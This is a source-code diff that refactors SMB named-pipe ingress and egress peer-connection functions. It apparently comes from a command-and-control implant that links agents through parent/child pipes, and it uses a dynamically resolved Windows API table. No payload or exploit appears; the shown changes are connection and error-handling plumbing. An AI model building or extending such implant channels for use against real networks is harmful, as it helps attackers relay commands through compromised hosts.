@@ -349,7 +349,8 @@ namespace Smb {
 
     VOID PeerConnectIngress (_stream *out, _stream **in) {
         HEXANE
-        // single handle for in/out
+        // when we are the parent, a new smb peer will be added to our list of peers
+        // we handle the ingress pipe state
 
         SECURITY_ATTRIBUTES sec_attr    = { };
         SMB_PIPE_SEC_ATTR smb_attr      = { };
@@ -365,22 +366,19 @@ namespace Smb {
         }
 
         SmbContextDestroy(&smb_attr);
-        if (!Ctx->win32.ConnectNamedPipe(handle, nullptr)) {
-            return_defer(ERROR_BROKEN_PIPE);
-        }
-
-        if (!Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &n_bytes, nullptr)) {
+        if (
+            !Ctx->win32.ConnectNamedPipe(handle, nullptr)||
+            !Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &n_bytes, nullptr)) {
             return_defer(ntstatus);
         }
 
         if (n_bytes > sizeof(uint32_t) * 2) {
             msg_length = n_bytes;
 
-            if (!Ctx->win32.ReadFile(handle, &peer_id, sizeof(uint32_t), &n_bytes, nullptr)) {
+            if (
+                !Ctx->win32.ReadFile(handle, &peer_id, sizeof(uint32_t), &n_bytes, nullptr) ||
+                Ctx->Session.PeerId != peer_id) {
                 return_defer(ntstatus);
-            }
-            if (Ctx->Session.PeerId != peer_id) {
-                return_defer(ERROR_NOT_READY);
             }
 
             (*in) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
@@ -404,8 +402,10 @@ namespace Smb {
 
     VOID PeerConnectEgress(_stream *out, _stream **in) {
         HEXANE
+        // egress handle is set up by the parent. this indicates that we are an smb peer.
 
         auto pipename = Ctx->Config.EgressPipename;
+
         if (!(Ctx->Config.EgressHandle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
             if (Ctx->Config.EgressHandle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {
 
@@ -420,14 +420,14 @@ namespace Smb {
         if (Ctx->win32.PeekNamedPipe(Ctx->Config.EgressHandle, nullptr, 0, nullptr, &(*in)->Length, nullptr)) {
             if ((*in)->Length > 0) {
 
-                if (!PipeRead(*in)) {
+                if (!Network::Smb::PipeRead(Ctx->Config.EgressHandle, *in)) {
                     return_defer(ntstatus);
                 }
             } else {
                 return_defer(ERROR_INSUFFICIENT_BUFFER);
             }
         }
-        if (!PipeWrite(out)) {
+        if (!Network::Smb::PipeWrite(Ctx->Config.EgressHandle, out)) {
             return_defer(ntstatus);
         }
 
